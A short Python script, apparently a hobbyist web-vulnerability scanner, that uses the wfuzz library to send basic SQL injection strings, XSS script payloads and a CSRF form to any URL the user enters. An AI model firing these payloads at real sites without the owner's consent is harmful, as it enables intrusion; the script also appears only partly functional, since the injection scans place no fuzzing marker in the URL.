import wfuzz

# Target URL (replace with the target URL)

target_url=input("Enter your url: ")


# Common wordlist for fuzzing
# wordlist = "/usr/share/wordlists/common.txt"

# # Function for a general fuzzing scan
# def general_fuzz():
#     print("[*] General fuzzing scan...")
#     with wfuzz.FuzzSession(target=target_url, payloads=[("file", dict(fn=wordlist))]) as session:
#         for result in session.fuzz():
#             print(result)

# Function for SQL injection fuzzing
def sql_injection_scan():
    print("[*] SQL Injection fuzzing...")
    sql_payloads = ["' OR 1=1 --", "' OR 'a'='a", "' OR ''='", "' OR 1=1#"]
    with wfuzz.FuzzSession(target=target_url, payloads=[("list", sql_payloads)]) as session:
        for result in session.fuzz():
            print(result)

# Function for XSS fuzzing
def xss_scan():
    print("[*] XSS fuzzing...")
    xss_payloads = ['<script>alert(1)</script>', '"><script>alert(1)</script>', "<img src=x onerror=alert(1)>"]
    with wfuzz.FuzzSession(target=target_url, payloads=[("list", xss_payloads)]) as session:
        for result in session.fuzz():
            print(result)

# Function for CSRF fuzzing
def csrf_scan():
    print("[*] CSRF fuzzing...")
    csrf_payloads = ["<form action='{}' method='POST'><input type='hidden' name='csrf' value='invalid'></form>".format(target_url)]
    with wfuzz.FuzzSession(target=target_url, payloads=[("list", csrf_payloads)]) as session:
        for result in session.fuzz():
            print(result)

# Function for directory scan
# def directory_scan():
#     print("[*] Directory scan...")
#     with wfuzz.FuzzSession(target=target_url + "/FUZZ", payloads=[("file", dict(fn=wordlist))]) as session:
#         for result in session.fuzz():
#             print(result)

# Main function to run all scans
def run_all_scans():
    print("[*] Starting fuzzing tests...")
    # general_fuzz()
    sql_injection_scan()
    xss_scan()
    csrf_scan()
    # directory_scan()

if __name__ == "__main__":
    run_all_scans()
